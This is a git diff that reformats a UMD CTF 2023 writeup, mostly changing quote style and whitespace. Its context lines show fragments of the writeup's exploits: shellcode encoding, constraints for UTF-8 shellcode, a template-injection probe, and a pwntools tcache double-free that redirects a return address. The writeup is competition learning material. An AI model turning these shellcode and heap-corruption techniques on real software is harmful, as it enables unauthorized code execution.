@@ -1,14 +1,12 @@
 ---
-title: "UMD CTF 2023 Writeup"
-date: "2023-05-03"
+title: 'UMD CTF 2023 Writeup'
+date: '2023-05-03'
 tags: ['Writeup']
 draft: false
-summary: "This is the writeup for the umd ctf 2023 which was held by the University of Maryland. They provided a lot of interesting challenges in the Pokemon theme which I really enjoy :>."
+summary: 'This is the writeup for the umd ctf 2023 which was held by the University of Maryland. They provided a lot of interesting challenges in the Pokemon theme which I really enjoy :>.'
 ---
 
-This is the writeup for the umd ctf 2023 which was held by the University of Maryland. They provided a lot of interesting challenges in the Pokemon theme which I really enjoy :>. 
-
-
+This is the writeup for the umd ctf 2023 which was held by the University of Maryland. They provided a lot of interesting challenges in the Pokemon theme which I really enjoy :>.
 
 | Category | Challenge                 | Description                            |
 | -------- | ------------------------- | -------------------------------------- |
@@ -28,7 +26,7 @@ This is the writeup for the umd ctf 2023 which was held by the University of Mar
 
 ### splash
 
->I bet you can't beat my totally legitimate Magikarp! I'll even let you use your Arceus.
+> I bet you can't beat my totally legitimate Magikarp! I'll even let you use your Arceus.
 
 This challenge is about integer overflow vulnerability.
 
@@ -42,7 +40,7 @@ A simple payload would lead us to get the flag.
 
 ### Pokemon games
 
->gotta catch them all... *right*?
+> gotta catch them all... _right_?
 
 It is another interesting game about Pokemon and shellcode.
 
@@ -73,7 +71,7 @@ def get_shellcode_pokemon_encode():
     catching_list = []
     for i in shellcode:
         catching_list.append(opcodes_rev[i])
-    
+
     return catching_list
 
 def found_pokemon():
@@ -137,7 +135,7 @@ if __name__ == "__main__":
 
 ### You Want Me To Run What??
 
->You Want Me To Run ***What***??
+> You Want Me To Run **_What_**??
 
 This challenge provided a binary, which is written in go, that accepts 16 bytes from the user and returns something as follows.
 
@@ -148,7 +146,7 @@ Time to show your message to the CPU and see what it thinks!
 Your message made the CPU sad :(
 ```
 
-However, it is really a taxing process to reverse engineer a binary written in go, as the symbol table is stripped and there are so many unrelated library functions that will also be compiled in the binary. 
+However, it is really a taxing process to reverse engineer a binary written in go, as the symbol table is stripped and there are so many unrelated library functions that will also be compiled in the binary.
 
 Try not to be lost in the functions, I first search for the `flag` string in the strings and found a function, `sub_4cdcc0`, that could probably read the flag for us. Starting from the main function would not be a good idea as the binary serves as a server and it would be hard to locate the function that processes our input.
 
@@ -176,7 +174,7 @@ There is another check function, `sub_46F340`, before our check functions 1 and 
 
 ![youwantmerunwhat-4](/static/images/UMD-CTF-2023-Writeup/youwantmerunwhat-4.png)
 
-So, it requires our input to be compatible with UTF-8 encoding and also has a length shorten than 16 bytes. Here is the way to construct the satisfied shellcode. 
+So, it requires our input to be compatible with UTF-8 encoding and also has a length shorten than 16 bytes. Here is the way to construct the satisfied shellcode.
 
 ```
 """
@@ -190,7 +188,7 @@ cannot use add/sub from immediate to register: 0x81, 0x83
 
 we use an trick here to avoid \x00
 push 0x4040012f
-pop bx 
+pop bx
 => only mov 0x12f to bx
 
 current ret addr: 0x4ce26a
@@ -222,7 +220,7 @@ Finally, we could get the flag by sending the payload.
 
 ### Terps Ticketing System
 
->Welcome to the Terps Ticketing System! We're currently giving out tickets for the UMDCTF going on right now. Just enter some information and grab your ticket!
+> Welcome to the Terps Ticketing System! We're currently giving out tickets for the UMDCTF going on right now. Just enter some information and grab your ticket!
 
 set num=0
 
@@ -230,13 +228,13 @@ set num=0
 
 ### Pop calc
 
->We have created a new calculator application to fit all your mathematical needs. Give it a try!
+> We have created a new calculator application to fit all your mathematical needs. Give it a try!
 
 SSTI
 
 However, since the application is a calculator, the response is only a value or ERROR sign but not a template-generated html. So, I didn't think of template injection at the beginning but for code injection in an eval-like function. However, after trying different payloads, I found that it seems using `[\d.]+[+-*/]?[\d.]+` regex for sanitization.
 
-Finally, when I tried `{{7*7}}`, I found it returned `ERROR 49`,  meaning our code has been evaluated. Then, it comes to a simple template injection for the ninja template. However, I don't why it returns `ERROR` and the payload has also been evaluated. 
+Finally, when I tried `{{7*7}}`, I found it returned `ERROR 49`, meaning our code has been evaluated. Then, it comes to a simple template injection for the ninja template. However, I don't why it returns `ERROR` and the payload has also been evaluated.
 
 ![pop-clac](/static/images/UMD-CTF-2023-Writeup/pop-clac.png)
 
@@ -244,9 +242,9 @@ Finally, when I tried `{{7*7}}`, I found it returned `ERROR 49`,  meaning our co
 
 ### Notsogeo
 
->Here is an early iteration of Geosint that is more similar to how GeoGuessr loads its Street View panorama. I wonder how we can find the location?
+> Here is an early iteration of Geosint that is more similar to how GeoGuessr loads its Street View panorama. I wonder how we can find the location?
 >
->Note: https://github.com/JustHackingCo/geosint this is not the source for this challenge but it is what the site is based off of :)
+> Note: https://github.com/JustHackingCo/geosint this is not the source for this challenge but it is what the site is based off of :)
 
 Two important API requests for loading the street view:
 
@@ -270,9 +268,9 @@ Send the request with the location will give us the flag:
 
 ### Homework Render
 
->https://hw-render.chall.lol/
+> https://hw-render.chall.lol/
 >
->Isn't writing math homework hard? We have created an easy-to-use homework submission portal that allows you to type up your homework. We don't think anyone can get into this server for free answers!
+> Isn't writing math homework hard? We have created an easy-to-use homework submission portal that allows you to type up your homework. We don't think anyone can get into this server for free answers!
 
 Latex injection
 
@@ -293,23 +291,19 @@ Some exploits:
 
 ### i-hate-wasm
 
->https://i-heart-wasm.chall.lol/
+> https://i-heart-wasm.chall.lol/
 >
->I've been messing around with WASM lately. Turns out, there's a ton of cool things you can do with it! Time to rewrite everything in Rust.
-
-
+> I've been messing around with WASM lately. Turns out, there's a ton of cool things you can do with it! Time to rewrite everything in Rust.
 
 ### POKéPTCHA
 
->pokeptcha.chall.lol
+> pokeptcha.chall.lol
 >
->Team Rocket keeps taking down my website! I'm testing out this new type of captcha, but it doesn't seem to be working as expected. None of the choices are valid! Can you solve it for me?
-
-
+> Team Rocket keeps taking down my website! I'm testing out this new type of captcha, but it doesn't seem to be working as expected. None of the choices are valid! Can you solve it for me?
 
 ## Others
 
-This weekend, I also played two pwn challenges with my friend.  
+This weekend, I also played two pwn challenges with my friend.
 
 ### Belt
 
@@ -423,7 +417,7 @@ In this case, if we input nothing, the original content on the stack will be pas
 
 **bypass the key check by off-by-one**
 
-However, when initializing the account registration chunk, it will generate an 0x28 bytes security key as a field on the chunk. To print the other fields of the account registration chunk, we need to enter that key. 
+However, when initializing the account registration chunk, it will generate an 0x28 bytes security key as a field on the chunk. To print the other fields of the account registration chunk, we need to enter that key.
 
 ![belt-4](/static/images/UMD-CTF-2023-Writeup/secure-banking-4.png)
 
@@ -438,7 +432,7 @@ tatal malloc size: 0xd8
 name: 0x8
 key: 0x28(0x20+\x00*8)
 AC holders: 0x28(0x8*5)
-money chunk ptrs: 0x80 (up to 16 chunks ptr for money) 
+money chunk ptrs: 0x80 (up to 16 chunks ptr for money)
 ```
 
 When we edit the name field in the edit function, there is a typical vulnerable programming pattern for off-by-one. The `scanf` function would append `0x00` after the reading of strings, and strcpy would keep the `0x00` and pass it to the destination memory. In this case, our key field can be append null at the beginning, so that we could pass the key check.
@@ -475,7 +469,7 @@ def register(name=b'jack', ac=b'11111'):
     for i in range(5):
         sh.recvuntil(b"Ac")
         sh.sendline(ac)
-    
+
 def deposit(size, val, index):
     menu(b'1')
     sh.recvuntil(b'Enter the size of $$$ stacks(<0x120):')
@@ -516,7 +510,7 @@ def open_vault(key):
         log.info(hex(addr))
         if i == 4:
             return addr
-    
+
     return addr # the last addr 0x7ffd867417a0
 
 
@@ -525,11 +519,11 @@ def arbitrary_address_write(addr, val):
     for i in range(7):
         deposit(b'16', b'A'*0x10, 0)
 
-    # chunks for double free 
+    # chunks for double free
     deposit(b'16', b'A'*0x10, 7)
     deposit(b'16', b'B'*0x10, 8)
     deposit(b'16', b'B'*0x10, 9)
-    
+
     # # placed in tcache
     for i in range(7):
         withdraw(str(i).encode('utf-8'))
@@ -563,7 +557,7 @@ def exploit():
     log.info(f"Overwite the ret addr to win function: {hex(win_addr)}")
 
     arbitrary_address_write(p64(ret_main_addr-8), b'A'*8+p64(win_addr+1)) ## movaps issue so +1
-    
+
     menu(b'5')
     sh.interactive()
 
@@ -572,4 +566,3 @@ if __name__ == "__main__":
 ```
 
 ![belt-7](/static/images/UMD-CTF-2023-Writeup/secure-banking-7.png)
-
